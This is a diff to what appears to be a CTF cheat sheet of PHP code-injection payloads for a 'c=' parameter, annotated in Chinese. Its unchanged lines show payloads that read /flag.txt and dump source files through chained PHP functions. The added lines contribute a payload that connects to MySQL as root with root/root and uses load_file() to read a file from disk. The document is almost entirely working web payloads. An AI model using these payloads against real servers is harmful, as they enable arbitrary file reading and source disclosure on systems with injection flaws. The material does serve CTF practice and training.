@@ -111,6 +111,15 @@ foreach($a as $f)
 c=include("/flag.txt"); //输出文件
 c=require("/flag.txt"); //输出文件
 c=readgzfile("/flag.txt");//输出文件
+
+//创建PDO（数据库对象），连接系统数据库，执行查询语句
+c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
+foreach($dbh->query('select load_file("/flag36.txt")') as $row)
+{echo($row[0])."|"; }
+$dbh = null;}
+catch (PDOException $e) 
+{echo $e->getMessage();exit(0);}exit(0);
+
 c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
 // getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
